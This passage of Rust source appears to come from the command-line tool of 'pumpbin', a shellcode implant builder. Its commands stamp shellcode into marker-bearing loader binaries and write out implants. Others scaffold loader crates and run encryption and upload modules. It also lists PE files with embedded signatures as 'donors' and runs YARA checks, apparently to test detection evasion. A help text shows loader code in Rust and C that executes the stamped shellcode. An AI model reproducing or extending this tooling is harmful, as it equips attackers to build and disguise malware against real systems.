                plugin_version: "0.1.0".to_string(),
                desc: "Created by pumpbin-cli stamp".to_string(),
                platform: parsed_platform,
                binary_type: parsed_binary_type,
                save_type: ShellcodeSaveType::Local,
                src_prefix: marker.clone(),
                size_holder: size_holder.clone(),
                max_len_override: None,
                primary_module: None,
                post_modules: vec![],
                module_config: BTreeMap::new(),
            }
            .assemble()
            .map_err(|e| {
                if e.chain()
                    .any(|c| c.to_string().contains("not found in binary"))
                {
                    anyhow!(
                        "{loader} does not contain the shellcode marker \"{marker}\".\n\n\
                         The loader must include this exact byte sequence at compile time \
                         so PumpBin knows where to write your shellcode.\n\n\
                         Options:\n  \
                         1. Build a marker-ready loader:  pumpbin-cli new-loader myloader --platform {platform_hint} --pack\n  \
                         2. Embed the marker manually:    see pumpbin-cli inspect --help-markers\n  \
                         3. Verify an existing binary:    pumpbin-cli inspect {loader}",
                        loader = loader.display(),
                        marker = marker,
                        platform_hint = platform
                            .as_deref()
                            .unwrap_or(match parsed_platform {
                                Platform::Windows => "windows",
                                Platform::Linux => "linux",
                                Platform::Darwin => "darwin",
                            }),
                    )
                } else {
                    e.context(format!("assembling .b1n from '{}'", loader.display()))
                }
            })?;

            if let Some(b1n_path) = save_b1n {
                pumpbin::utils::atomic_write(b1n_path, &b1n_bytes)
                    .with_context(|| format!("saving .b1n to '{}'", b1n_path.display()))?;
                eprintln!(
                    "PB  {:<20}  {}  [*] saved .b1n -> {}",
                    loader_label,
                    target_label,
                    b1n_path.display()
                );
            }

            let mut plugin_obj = Plugin::decode_from_slice(&b1n_bytes)?;

            let mut runtime_config = parse_module_config(&[])?;
            for entry in post {
                if let Some((id, args)) = entry.split_once(':') {
                    plugin_obj.plugins.modules_mut().push(id.to_string());
                    runtime_config.insert(format!("post:{id}"), args.to_string());
                } else {
                    plugin_obj.plugins.modules_mut().push(entry.clone());
                }
            }

            let (resolved_platform, resolved_binary_type) = plugin_obj
                .bins()
                .auto_select_target(Some(parsed_platform), Some(parsed_binary_type))?;
            plugin_obj.validate_for_generation(resolved_platform, resolved_binary_type)?;

            let bin = plugin_obj
                .bins()
                .get_that_binary(resolved_platform, resolved_binary_type)
                .ok_or_else(|| anyhow!("failed to retrieve binary for platform/type"))?;

            plugin_obj.validate_shellcode_source(shellcode)?;

            let schema_fields = plugin_schema_fields(&plugin_obj);
            let runtime_config =
                normalize_runtime_config_for_schema(runtime_config, &schema_fields)?;

            let sc_bytes = std::fs::read(shellcode.as_str()).unwrap_or_default();
            let sc_size = sc_bytes.len();
            let chain = plugin_obj.plugins.modules().to_vec();
            if chain.is_empty() {
                eprintln!(
                    "PB  {:<20}  {}  [*] injecting shellcode ({} B)",
                    loader_label, target_label, sc_size
                );
            } else {
                eprintln!(
                    "PB  {:<20}  {}  [*] injecting shellcode ({} B) + {}",
                    loader_label,
                    target_label,
                    sc_size,
                    chain.join(", ")
                );
            }

            let implant =
                plugin_obj.replace_binary(bin, shellcode.clone(), vec![], Some(&runtime_config))?;

            let output_path = if let Some(out) = output {
                out.clone()
            } else {
                let ext = ext_for_output(resolved_platform, resolved_binary_type);
                let base = name.to_lowercase().replace(' ', "_");
                let candidate = PathBuf::from(format!("{base}.{ext}"));
                if candidate.exists() {
                    let ts = Local::now().format("%Y%m%d_%H%M%S").to_string();
                    PathBuf::from(format!("{base}_{ts}.{ext}"))
                } else {
                    candidate
                }
            };

            pumpbin::utils::atomic_write(&output_path, &implant)
                .with_context(|| format!("writing implant to '{}'", output_path.display()))?;
            eprintln!(
                "PB  {:<20}  {}  [+] wrote {}",
                loader_label,
                target_label,
                output_path.display()
            );
            Ok(())
        }
        Commands::Pack {
            crate_dir,
            profile,
            output,
            skip_build,
        } => pack_crate(crate_dir, profile, output.as_deref(), *skip_build),
        Commands::Inspect {
            binary,
            diff,
            brief,
            verify,
            help_markers,
        } => {
            if *help_markers {
                print_help_markers();
                return Ok(());
            }

            // Auto-detect: if this looks like a raw binary (not a .b1n),
            // run the loader marker scan (or --verify) instead of the .b1n inspector.
            let bytes = std::fs::read(binary)
                .with_context(|| format!("failed to read '{}'", binary.display()))?;
            let is_b1n = pumpbin::plugin::Plugin::decode_from_slice(&bytes).is_ok();
            if *verify || !is_b1n {
                if *verify {
                    verify_binary(binary)?;
                }
                if !is_b1n {
                    inspect_loader_binary(binary, &bytes, cli.json);
                }
                return Ok(());
            }

            let left = pumpbin::inspect::inspect(binary)?;
            if *brief {
                // One-liner: name, populated slots, module count.
                let slots: Vec<String> = left
                    .platforms
                    .iter()
                    .flat_map(|p| {
                        p.binary_types
                            .iter()
                            .map(|b| format!("{}/{}", p.name.to_lowercase(), b))
                    })
                    .collect();
                let mods = left.modules.len();
                let module_word = if mods == 1 { "module" } else { "modules" };
                println!(
                    "{:<24} {:<32} {} {}",
                    left.plugin_name,
                    slots.join(", "),
                    mods,
                    module_word
                );
                return Ok(());
            }
            if cli.json {
                if let Some(other_path) = diff {
                    let right = pumpbin::inspect::inspect(other_path)?;
                    // JSON diff form: emit both reports + a diff field.
                    #[derive(serde::Serialize)]
                    struct DiffPayload<'a> {
                        left: &'a pumpbin::inspect::InspectReport,
                        right: &'a pumpbin::inspect::InspectReport,
                        text: String,
                    }
                    let payload = DiffPayload {
                        left: &left,
                        right: &right,
                        text: pumpbin::inspect::render_diff(&left, &right),
                    };
                    emit_json_ok(payload);
                } else {
                    emit_json_ok(&left);
                }
            } else if let Some(other_path) = diff {
                let right = pumpbin::inspect::inspect(other_path)?;
                print!("{}", pumpbin::inspect::render_diff(&left, &right));
            } else {
                print!("{}", pumpbin::inspect::render_text(&left));
            }
            Ok(())
        }
        Commands::Convert {
            input,
            format,
            output,
        } => {
            let fmt = pumpbin::OutputFormat::from_str_ci(format).ok_or_else(|| {
                anyhow::anyhow!(
                    "Unknown format {format:?}. Expected one of: raw, hex, c, csharp, python, base64."
                )
            })?;
            let bytes = std::fs::read(input)?;
            let out = pumpbin::convert::convert(&bytes, fmt);
            if let Some(out_path) = output {
                pumpbin::utils::atomic_write(out_path, &out)?;
                if cli.json {
                    #[derive(serde::Serialize)]
                    struct ConvertResult<'a> {
                        input: &'a std::path::Path,
                        output: &'a std::path::Path,
                        input_bytes: usize,
                        output_bytes: usize,
                        format: String,
                    }
                    emit_json_ok(ConvertResult {
                        input,
                        output: out_path,
                        input_bytes: bytes.len(),
                        output_bytes: out.len(),
                        format: format.clone(),
                    });
                } else {
                    tracing::info!(output = %out_path.display(), bytes = out.len(), "Converted");
                }
            } else {
                // stdout. Raw format writes bytes; everything else is ASCII.
                use std::io::Write;
                std::io::stdout().write_all(&out)?;
            }
            Ok(())
        }
        Commands::Build { profile } => {
            tracing::info!(profile = ?profile, "Loading build profile");
            let profile = pumpbin::Profile::from_toml(profile)?;
            tracing::info!(
                schema = %profile.schema,
                plugin = ?profile.plugin.source,
                platform = %profile.target.platform,
                binary_type = %profile.target.binary_type,
                "Profile loaded"
            );
            let artifact = profile.execute()?;
            tracing::info!(
                output = %artifact.output_path.display(),
                bytes = artifact.bytes_written,
                "Build complete"
            );
            if cli.json {
                emit_json_ok(&artifact);
            }
            Ok(())
        }
        Commands::Module(sub) => match sub {
            ModuleCommands::List { options, id } => {
                list_modules(*options, id.as_deref(), cli.json)
            }
            ModuleCommands::Test {
                id,
                input,
                args,
                output,
                debug,
            } => {
            use pumpbin::modules::external::{registry, wire::WireKind};
            use std::io::{Read, Write};

            if *debug {
                // SAFETY: single-threaded CLI; env var is read only inside
                // external::invoke() on this same thread.
                unsafe { std::env::set_var("PUMPBIN_MODULE_DEBUG", "1") };
            }

            let payload: Vec<u8> = if input == "-" {
                let mut buf = Vec::new();
                std::io::stdin().read_to_end(&mut buf)?;
                buf
            } else {
                std::fs::read(input)?
            };

            // Resolve kind: external registry tells us explicitly;
            // for built-ins we probe each kind by id and the first
            // hit wins (built-ins don't overlap).
            let kind = if let Some(ext) = registry().get(id) {
                Some(ext.kind())
            } else if pumpbin::modules::encrypt_modules()
                .iter()
                .any(|m| m.id() == id)
            {
                Some(WireKind::Encrypt)
            } else if pumpbin::modules::format_encrypted_modules()
                .iter()
                .any(|m| m.id() == id)
            {
                Some(WireKind::FormatEncrypted)
            } else if pumpbin::modules::format_url_modules()
                .iter()
                .any(|m| m.id() == id)
            {
                Some(WireKind::FormatUrl)
            } else if pumpbin::modules::upload_remote_modules()
                .iter()
                .any(|m| m.id() == id)
            {
                Some(WireKind::UploadRemote)
            } else if pumpbin::modules::post_build_modules()
                .iter()
                .any(|m| m.id() == id)
            {
                Some(WireKind::PostBuild)
            } else {
                None
            };
            let kind = kind.ok_or_else(|| {
                anyhow!(
                    "module test: id '{id}' not registered. Run `pumpbin-cli module list` to see what's installed."
                )
            })?;

            let result: Vec<u8> = match kind {
                WireKind::Encrypt => {
                    let out = pumpbin::modules::dispatch::encrypt(id, &payload)?;
                    eprintln!(
                        "module '{id}' encrypted {} → {} bytes; {} pass entries:",
                        payload.len(),
                        out.encrypted.len(),
                        out.pass.len(),
                    );
                    for p in &out.pass {
                        eprintln!(
                            "  holder={}  replace_by={}",
                            String::from_utf8_lossy(&p.holder),
                            bytes_short(&p.replace_by)
                        );
                    }
                    out.encrypted
                }
                WireKind::FormatEncrypted => {
                    let out = pumpbin::modules::dispatch::format_encrypted(id, &payload)?;
                    eprintln!(
                        "module '{id}' reformatted {} → {} bytes; {} pass entries:",
                        payload.len(),
                        out.formatted.len(),
                        out.pass.len(),
                    );
                    for p in &out.pass {
                        eprintln!(
                            "  holder={}  replace_by={}",
                            String::from_utf8_lossy(&p.holder),
                            bytes_short(&p.replace_by)
                        );
                    }
                    out.formatted
                }
                WireKind::FormatUrl => {
                    let url = std::str::from_utf8(&payload)
                        .map_err(|e| anyhow!("format-url payload must be UTF-8: {e}"))?;
                    pumpbin::modules::dispatch::format_url(id, url)?.into_bytes()
                }
                WireKind::UploadRemote => {
                    pumpbin::modules::dispatch::upload_remote(id, &payload)?.into_bytes()
                }
                WireKind::PostBuild => {
                    let mut buf = payload;
                    pumpbin::modules::dispatch::post_build(id, args, &mut buf)?;
                    buf
                }
            };

            if output == "-" {
                std::io::stdout().write_all(&result)?;
            } else {
                std::fs::write(output, &result)?;
            }
            Ok(())
        }}, // end Commands::Module
        Commands::NewLoader {
            dest,
            name,
            platform,
            padding_bytes,
            randomize_markers,
            binary_size_holder,
            pre_load_libs,
            no_rwx,
            pack,
        } => {
            let dest = dest.as_path();
            let crate_name = name.clone().unwrap_or_else(|| {
                dest.file_name()
                    .and_then(|s| s.to_str())
                    .unwrap_or("loader")
                    .to_string()
            });
            let parsed_platform = parse_platform(platform)?;
            if *padding_bytes < 64 {
                return Err(anyhow!(
                    "--padding-bytes must be at least 64 (got {padding_bytes}); the placeholder needs enough room for any shellcode the operator will stamp"
                ));
            }
            let opts = pumpbin::scaffold::LoaderOpts {
                padding_bytes: *padding_bytes,
                randomize_markers: *randomize_markers,
                binary_size_holder: *binary_size_holder,
                pre_load_libs: pre_load_libs.clone(),
                no_rwx: *no_rwx,
            };
            pumpbin::scaffold::write_loader_scaffold(dest, &crate_name, parsed_platform, opts)?;
            tracing::info!(
                dest = %dest.display(),
                name = %crate_name,
                platform = %parsed_platform,
                padding_bytes = padding_bytes,
                randomized = randomize_markers,
                binary_size = binary_size_holder,
                "Scaffolded loader crate",
            );
            if *pack {
                if let Err(e) = pack_crate(dest, "release", None, false) {
                    eprintln!("warning: scaffold succeeded but pack failed: {e}");
                    eprintln!("  retry with: pumpbin-cli pack {}", dest.display());
                } else {
                    println!(
                        "Scaffolded and packed: {0}/{1}.b1n",
                        dest.display(),
                        crate_name
                    );
                }
            } else {
                println!(
                    "Scaffolded loader crate at {0}.\n  pumpbin-cli pack {0}    # build + assemble .b1n in one step",
                    dest.display(),
                );
            }
            Ok(())
        }
        Commands::Check {
            artifact,
            yara_rules,
            yara_bin,
        } => yara_check(artifact, yara_rules, yara_bin.as_deref()),
        Commands::ListDonors {
            path,
            recursive,
            embedded_only,
        } => {
            list_donors(path, *recursive, *embedded_only)?;
            Ok(())
        }
        Commands::Completions {
            shell,
            command_name,
        } => {
            let mut cmd = Cli::command();
            let generator: Shell = shell.clone().into();
            generate(generator, &mut cmd, command_name, &mut std::io::stdout());
            Ok(())
        }
    }
}

/// One row of `list-modules` output. Owned so we can build it
/// uniformly for built-ins (static-string traits) and externals
/// (owned manifest fields).
#[derive(serde::Serialize)]
struct ModuleRow {
    id: String,
    source: String,
    description: String,
    kind: String,
    /// `(key, type, required, default, description)` for every arg.
    args: Vec<ArgRow>,
}

#[derive(serde::Serialize)]
struct ArgRow {
    key: String,
    arg_type: String,
    required: bool,
    default: Option<String>,
    description: String,
}

fn list_modules(show_options: bool, only_id: Option<&str>, json: bool) -> Result<()> {
    use pumpbin::modules::external::{registry, wire::WireKind};
    use pumpbin::modules::{
        encrypt_modules, format_encrypted_modules, format_url_modules, post_build_modules,
        upload_remote_modules,
    };

    let ext = registry();

    let print_section = |title: &str, rows: &[ModuleRow]| {
        let filtered: Vec<&ModuleRow> = rows
            .iter()
            .filter(|r| only_id.is_none_or(|want| r.id == want))
            .collect();
        if filtered.is_empty() {
            return;
        }
        println!("{title}:");
        for r in filtered {
            println!("  {} ({}) - {}", r.id, r.source, r.description);
            if show_options {
                if r.args.is_empty() {
                    println!("    (no documented args)");
                } else {
                    for a in &r.args {
                        let req = if a.required { " (required)" } else { "" };
                        let dflt = a
                            .default
                            .as_deref()
                            .map(|d| format!(" [default: {d}]"))
                            .unwrap_or_default();
                        println!(
                            "    {key}: {ty}{req}{dflt}",
                            key = a.key,
                            ty = a.arg_type,
                            req = req,
                            dflt = dflt,
                        );
                        if !a.description.is_empty() {
                            println!("        {}", a.description);
                        }
                    }
                }
            }
        }
    };

    let mut found_any = false;

    let mut encrypt_rows: Vec<ModuleRow> = encrypt_modules()
        .iter()
        .map(|m| ModuleRow {
            id: m.id().to_string(),
            source: "built-in".to_string(),
            description: m.description().to_string(),
            kind: "encrypt".to_string(),
            args: m.args().into_iter().map(arg_from_spec).collect(),
        })
        .collect();
    for m in ext.all().filter(|m| m.kind() == WireKind::Encrypt) {
        encrypt_rows.push(external_row(m, "encrypt"));
    }
    if let Some(want) = only_id {
        if encrypt_rows.iter().any(|r| r.id == want) {
            found_any = true;
        }
    } else if !encrypt_rows.is_empty() {
        found_any = true;
    }
    if !json {
        print_section("encrypt", &encrypt_rows);
    }

    let mut fe_rows: Vec<ModuleRow> = format_encrypted_modules()
        .iter()
        .map(|m| ModuleRow {
            id: m.id().to_string(),
            source: "built-in".to_string(),
            description: m.description().to_string(),
            kind: "format-encrypted".to_string(),
            args: m.args().into_iter().map(arg_from_spec).collect(),
        })
        .collect();
    for m in ext.all().filter(|m| m.kind() == WireKind::FormatEncrypted) {
        fe_rows.push(external_row(m, "format-encrypted"));
    }
    if let Some(want) = only_id {
        if fe_rows.iter().any(|r| r.id == want) {
            found_any = true;
        }
    }
    if !json {
        print_section("format_encrypted", &fe_rows);
    }

    let mut url_rows: Vec<ModuleRow> = format_url_modules()
        .iter()
        .map(|m| ModuleRow {
            id: m.id().to_string(),
            source: "built-in".to_string(),
            description: m.description().to_string(),
            kind: "format-url".to_string(),
            args: m.args().into_iter().map(arg_from_spec).collect(),
        })
        .collect();
    for m in ext.all().filter(|m| m.kind() == WireKind::FormatUrl) {
        url_rows.push(external_row(m, "format-url"));
    }
    if let Some(want) = only_id {
        if url_rows.iter().any(|r| r.id == want) {
            found_any = true;
        }
    }
    if !json {
        print_section("format_url", &url_rows);
    }

    let mut ur_rows: Vec<ModuleRow> = upload_remote_modules()
        .iter()
        .map(|m| ModuleRow {
            id: m.id().to_string(),
            source: "built-in".to_string(),
            description: m.description().to_string(),
            kind: "upload-remote".to_string(),
            args: m.args().into_iter().map(arg_from_spec).collect(),
        })
        .collect();
    for m in ext.all().filter(|m| m.kind() == WireKind::UploadRemote) {
        ur_rows.push(external_row(m, "upload-remote"));
    }
    if let Some(want) = only_id {
        if ur_rows.iter().any(|r| r.id == want) {
            found_any = true;
        }
    }
    if !json {
        print_section("upload_remote", &ur_rows);
    }

    let mut pb_rows: Vec<ModuleRow> = post_build_modules()
        .iter()
        .map(|m| ModuleRow {
            id: m.id().to_string(),
            source: "built-in".to_string(),
            description: m.description().to_string(),
            kind: "post-build".to_string(),
            args: m.args().into_iter().map(arg_from_spec).collect(),
        })
        .collect();
    for m in ext.all().filter(|m| m.kind() == WireKind::PostBuild) {
        pb_rows.push(external_row(m, "post-build"));
    }
    if let Some(want) = only_id {
        if pb_rows.iter().any(|r| r.id == want) {
            found_any = true;
        }
    }
    if json {
        // Collect all rows into a single flat JSON array before any
        // print_section call takes ownership of the Vecs.
        let all_rows: Vec<&ModuleRow> = encrypt_rows
            .iter()
            .chain(fe_rows.iter())
            .chain(url_rows.iter())
            .chain(ur_rows.iter())
            .chain(pb_rows.iter())
            .filter(|r| only_id.is_none_or(|want| r.id == want))
            .collect();
        emit_json_ok(all_rows);
        for w in ext.warnings() {
            eprintln!("warning: {w}");
        }
        return Ok(());
    }

    if !json {
        print_section("post_build", &pb_rows);
    }

    if let Some(want) = only_id {
        if !found_any {
            return Err(anyhow!(
                "list-modules: no module with id '{want}'. Drop --id to see what's installed."
            ));
        }
    }

    for w in ext.warnings() {
        eprintln!("warning: {w}");
    }
    Ok(())
}

fn arg_from_spec(s: pumpbin::modules::ArgSpec) -> ArgRow {
    ArgRow {
        key: s.key.to_string(),
        arg_type: s.arg_type.to_string(),
        required: s.required,
        default: s.default.map(|d| d.to_string()),
        description: s.description.to_string(),
    }
}

fn external_row(m: &pumpbin::modules::external::ExternalModule, kind: &str) -> ModuleRow {
    ModuleRow {
        id: m.id().to_string(),
        source: format!("external: {}", m.manifest_path.display()),
        description: m.description().to_string(),
        kind: kind.to_string(),
        args: m
            .manifest
            .args
            .iter()
            .map(|a| ArgRow {
                key: a.key.clone(),
                arg_type: if a.arg_type.is_empty() {
                    "string".to_string()
                } else {
                    a.arg_type.clone()
                },
                required: a.required,
                default: a.default.clone(),
                description: a.description.clone(),
            })
            .collect(),
    }
}

/// Render a byte string for human display. ASCII-printable verbatim,
/// non-printable as `0x..` hex. Truncates at 32 bytes with an ellipsis.
fn bytes_short(b: &[u8]) -> String {
    let take = b.len().min(32);
    let mut out = String::new();
    for &byte in &b[..take] {
        if byte.is_ascii_graphic() || byte == b' ' {
            out.push(byte as char);
        } else {
            out.push_str(&format!("\\x{byte:02x}"));
        }
    }
    if b.len() > take {
        out.push_str(&format!("... ({} bytes)", b.len()));
    }
    out
}

fn yara_check(
    artifact: &std::path::Path,
    rules: &std::path::Path,
    yara_bin_override: Option<&std::path::Path>,
) -> Result<()> {
    if !artifact.exists() {
        return Err(anyhow!("artifact not found: {}", artifact.display()));
    }
    if !rules.exists() {
        return Err(anyhow!("yara rules path not found: {}", rules.display()));
    }

    let yara_bin: std::path::PathBuf = match yara_bin_override {
        Some(p) => p.to_path_buf(),
        None => match which("yara") {
            Some(p) => p,
            None => {
                return Err(anyhow!(
                    "`yara` binary not found in PATH. Install it:\n  apt install yara       (Debian/Ubuntu)\n  brew install yara      (macOS)\n  pacman -S yara         (Arch)\nOr pass --yara-bin <path>."
                ));
            }
        },
    };

    let mut cmd = std::process::Command::new(&yara_bin);
    // -r recurses into rule directories (no-op for single files).
    // -w suppresses YARA's own warnings so output is just matches.
    cmd.arg("-r").arg("-w").arg(rules).arg(artifact);
    let out = cmd
        .output()
        .map_err(|e| anyhow!("failed to spawn yara ({}): {e}", yara_bin.display()))?;

    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);

    if !out.status.success() {
        return Err(anyhow!(
            "yara exited with {}: {}",
            out.status,
            stderr.trim()
        ));
    }

    let matches: Vec<&str> = stdout.lines().filter(|l| !l.trim().is_empty()).collect();
    if matches.is_empty() {
        println!(
            "clean: no YARA matches in {} against {}",
            artifact.display(),
            rules.display()
        );
        Ok(())
    } else {
        println!(
            "{} YARA match(es) against {}:",
            matches.len(),
            artifact.display()
        );
        for m in &matches {
            println!("  {m}");
        }
        Err(anyhow!("{} YARA rule(s) matched", matches.len()))
    }
}

fn which(name: &str) -> Option<std::path::PathBuf> {
    let path = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path) {
        let cand = dir.join(name);
        if cand.is_file() {
            return Some(cand);
        }
    }
    None
}

fn list_donors(dir: &std::path::Path, recursive: bool, embedded_only: bool) -> Result<()> {
    let mut files: Vec<std::path::PathBuf> = Vec::new();
    collect_pe_paths(dir, recursive, &mut files)?;
    files.sort();

    if files.is_empty() {
        eprintln!("no PE files found under {}", dir.display());
        return Ok(());
    }

    let mut embedded = 0usize;
    let mut catalog_only = 0usize;
    let mut errored = 0usize;
    for path in &files {
        let bytes = match std::fs::read(path) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("  ! {}: read error: {e}", path.display());
                errored += 1;
                continue;
            }
        };
        match pumpbin::pe::read_security_dir(&bytes) {
            Ok((0, 0)) => {
                if !embedded_only {
                    println!("  catalog-only  {}", path.display());
                }
                catalog_only += 1;
            }
            Ok((off, sz)) => {
                println!("  embedded ({sz:>7} B at 0x{off:08X})  {}", path.display());
                embedded += 1;
            }
            Err(_) => {
                // Not a PE, skip silently — directory may mix file types.
            }
        }
    }
    eprintln!(
        "\n{} embedded, {} catalog-only, {} errored ({} files scanned under {})",
        embedded,
        catalog_only,
        errored,
        files.len(),
        dir.display()
    );
    Ok(())
}

fn collect_pe_paths(
    dir: &std::path::Path,
    recursive: bool,
    out: &mut Vec<std::path::PathBuf>,
) -> Result<()> {
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        let ft = entry.file_type()?;
        if ft.is_dir() {
            if recursive {
                let _ = collect_pe_paths(&path, true, out);
            }
            continue;
        }
        if !ft.is_file() {
            continue;
        }
        let ext = path
            .extension()
            .and_then(|s| s.to_str())
            .map(|s| s.to_ascii_lowercase());
        if matches!(ext.as_deref(), Some("exe" | "dll" | "sys")) {
            out.push(path);
        }
    }
    Ok(())
}

/// If `plugin` is a directory, resolve to `<dir>/<name>.b1n` using
/// `[package.metadata.pumpbin]` in that crate's Cargo.toml.
/// Returns the path unchanged when it's already a file.
fn resolve_plugin_path(plugin: &Path) -> Result<PathBuf> {
    if plugin.is_dir() {
        let (_, md) = pumpbin::pack::read_loader_metadata(plugin)?;
        let b1n = plugin.join(format!("{}.b1n", md.name));
        if !b1n.exists() {
            bail!(
                "no .b1n at {}; run `pumpbin-cli pack {}` first",
                b1n.display(),
                plugin.display()
            );
        }
        Ok(b1n)
    } else {
        Ok(plugin.to_path_buf())
    }
}

/// Inspect a raw loader binary for PumpBin shellcode markers.
/// Called by `inspect` when the path is not a recognisable .b1n.
fn inspect_loader_binary(path: &Path, bytes: &[u8], json: bool) {
    use pumpbin::scaffold::{DEFAULT_PREFIX, DEFAULT_SIZE_HOLDER};

    let file_size = bytes.len();
    let platform = detect_platform_from_binary(bytes)
        .map(|p| p.to_string().to_lowercase())
        .unwrap_or_else(|| "unknown".to_string());

    // Scan for the shellcode prefix.
    let prefix = DEFAULT_PREFIX.as_bytes();
    let size_holder = DEFAULT_SIZE_HOLDER.as_bytes();

    let prefix_offset = memchr::memmem::find(bytes, prefix);
    let size_holder_offset = memchr::memmem::find(bytes, size_holder);

    // Measure padding capacity: count constant bytes after the prefix.
    let capacity = prefix_offset.map(|off| {
        let start = off + prefix.len();
        if start >= bytes.len() {
            return 0;
        }
        let pad = bytes[start];
        bytes[start..]
            .iter()
            .take_while(|&&b| b == pad)
            .count()
    });

    let marker_found = prefix_offset.is_some();
    let holder_found = size_holder_offset.is_some();
    let suitable = marker_found && holder_found;

    if json {
        #[derive(serde::Serialize)]
        struct LoaderReport {
            file: String,
            file_size: usize,
            platform: String,
            shellcode_marker: Option<usize>,
            size_holder: Option<usize>,
            capacity_bytes: Option<usize>,
            suitable_for_stamp: bool,
        }
        emit_json_ok(LoaderReport {
            file: path.display().to_string(),
            file_size,
            platform,
            shellcode_marker: prefix_offset,
            size_holder: size_holder_offset,
            capacity_bytes: capacity,
            suitable_for_stamp: suitable,
        });
        return;
    }

    println!("file:      {} ({} bytes)", path.display(), file_size);
    println!("format:    {}", platform);
    println!();
    println!("markers:");
    match prefix_offset {
        Some(off) => println!(
            "  shellcode    {:?}   offset 0x{:X}",
            DEFAULT_PREFIX, off
        ),
        None => println!("  shellcode    {:?}   NOT FOUND", DEFAULT_PREFIX),
    }
    match size_holder_offset {
        Some(off) => println!(
            "  size-holder  {:?}   offset 0x{:X}",
            DEFAULT_SIZE_HOLDER, off
        ),
        None => println!("  size-holder  {:?}   NOT FOUND", DEFAULT_SIZE_HOLDER),
    }
    println!();
    match capacity {
        Some(n) if n > 0 => println!("capacity:  {} bytes ({} KiB)", n, n / 1024),
        _ => println!("capacity:  unknown"),
    }
    println!();
    if suitable {
        println!("verdict:   SUITABLE: ready for pumpbin-cli stamp");
    } else {
        println!("verdict:   NOT SUITABLE: add markers before stamping");
        println!("           pumpbin-cli inspect --help-markers");
    }
}

/// Print a concise, language-agnostic guide on how to embed PumpBin
/// markers into a loader. Called by `inspect --help-markers`.
fn print_help_markers() {
    println!(
        r#"PUMPBIN MARKER REFERENCE

PumpBin locates shellcode in a compiled binary by scanning for a known
byte sequence (the marker). Two markers must be present:

  SHELLCODE MARKER   $$SHELLCODE$$  (13 bytes)
    Marks the start of the shellcode region.
    Follow it immediately with N bytes of constant padding. The loader
    will execute the shellcode placed here by pumpbin-cli stamp.

  SIZE HOLDER        $$99999$$      (9 bytes)
    Replaced at stamp time with the shellcode length as a decimal string.
    Your loader reads this at runtime to get the byte count.

RUST (recommended: pumpbin-cli new-loader handles this automatically)

  In build.rs:
    let mut buf = b"$$SHELLCODE$$".to_vec();
    buf.extend(vec![0u8; 1_048_576]);   // 1 MiB capacity
    std::fs::write("shellcode.bin", buf).unwrap();

  In src/main.rs:
    static SC: &[u8] = include_bytes!("../shellcode.bin");
    const SZ: &str   = "$$99999$$";
    let len = SZ.parse::<usize>().unwrap_or(0);
    let shellcode = &SC[..len];

C / C++ (volatile prevents the optimizer from removing the region)

    volatile unsigned char sc[] =
        "$$SHELLCODE$$"
        "\x00\x00\x00..."   // N zero bytes for capacity
    ;
    volatile char sz[] = "$$99999$$";
    size_t len = strtoul((char*)sz, NULL, 10);

VERIFY

  After building your loader, confirm the markers are present:
    pumpbin-cli inspect loader.exe

STAMP

    pumpbin-cli stamp --loader loader.exe --shellcode payload.bin
"#
    );
}

fn default_scaffold_platform() -> String {
    if cfg!(target_os = "linux") {
        "linux".to_string()
    } else if cfg!(target_os = "windows") {
        "windows".to_string()
    } else if cfg!(target_os = "macos") {
        "darwin".to_string()
    } else {
        "linux".to_string()
    }
}

fn pack_crate(
    crate_dir: &Path,
    profile: &str,
    output_override: Option<&Path>,
    skip_build: bool,
) -> Result<()> {
    let (cargo_pkg_name, md) = pumpbin::pack::read_loader_metadata(crate_dir)?;
    let platform = parse_platform(&md.platform)?;
    let binary_type = parse_binary_type(&md.binary_type)?;
    let save_type = parse_save_type(&md.save_type)?;

    let crate_label = crate_dir
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or("loader");
    let target_str = format!(
        "{}/{}",
        match platform {
            Platform::Windows => "win",
            Platform::Linux => "linux",
            Platform::Darwin => "darwin",
        },
        match binary_type {
            BinaryType::Executable => "exe",
            BinaryType::DynamicLibrary => "lib",
        }
    );

    // 1. Build the crate (unless --skip-build).
    if !skip_build {
        eprintln!(
            "PB  {:<20}  {}  [*] cargo build ({})",
            crate_label, target_str, profile
        );
        let cargo_args: &[&str] = if profile == "release" {
            &["build", "--release"]
        } else if profile == "dev" || profile == "debug" {
            &["build"]
        } else {
            // Custom Cargo profiles: pass --profile <name>.
            &["build", "--profile"]
        };
        let mut cmd = Command::new(std::env::var("CARGO").unwrap_or_else(|_| "cargo".into()));
        cmd.current_dir(crate_dir);
        for a in cargo_args {
            cmd.arg(a);
        }
        if cargo_args.last() == Some(&"--profile") {
            cmd.arg(profile);
        }
        let status = cmd
            .status()
            .with_context(|| format!("failed to invoke cargo in {}", crate_dir.display()))?;
        if !status.success() {
            bail!(
                "cargo build (profile `{}`) failed in {} with status {}",
                profile,
                crate_dir.display(),
                status
            );
        }
    }

    // 2. Locate the built artifact.
    // Cargo's `dev`/`debug` profile writes to target/debug, not target/dev.
    let artifact_subdir = if profile == "dev" { "debug" } else { profile };
    let template_path = pumpbin::pack::expected_artifact_path(
        crate_dir,
        &cargo_pkg_name,
        platform,
        binary_type,
        artifact_subdir,
    );
    let template_bytes = std::fs::read(&template_path).with_context(|| {
        format!(
            "no built artifact at {} -- did `cargo build --{}` succeed?",
            template_path.display(),
            profile
        )
    })?;

    // 3. Assemble baseline module config + bake in the metadata's
    // default post chain.
    let mut cfg = BTreeMap::new();
    let mut post_modules = Vec::new();
    for (idx, post) in md.post.iter().enumerate() {
        post_modules.push(post.id.clone());
        for (k, v) in &post.config {
            cfg.insert(format!("post_chain.{}.config.{}", idx, k), v.clone());
        }
    }

    let data = pumpbin::pack::B1nBuilder {
        template_bytes,
        name: md.name.clone(),
        author: md.author,
        plugin_version: md.plugin_version,
        desc: md.description,
        platform,
        binary_type,
        save_type,
        src_prefix: md.src_prefix,
        size_holder: md.size_holder,
        max_len_override: md.max_len,
        primary_module: None,
        post_modules,
        module_config: cfg,
    }
    .assemble()
    .with_context(|| format!("assembling .b1n from {}", template_path.display()))?;

    // 4. Resolve output path: explicit > <crate>/<name>.b1n.
    let output_path = match output_override {
        Some(p) => p.to_path_buf(),
        None => crate_dir.join(format!("{}.b1n", md.name)),
    };

    pumpbin::utils::atomic_write(&output_path, &data)
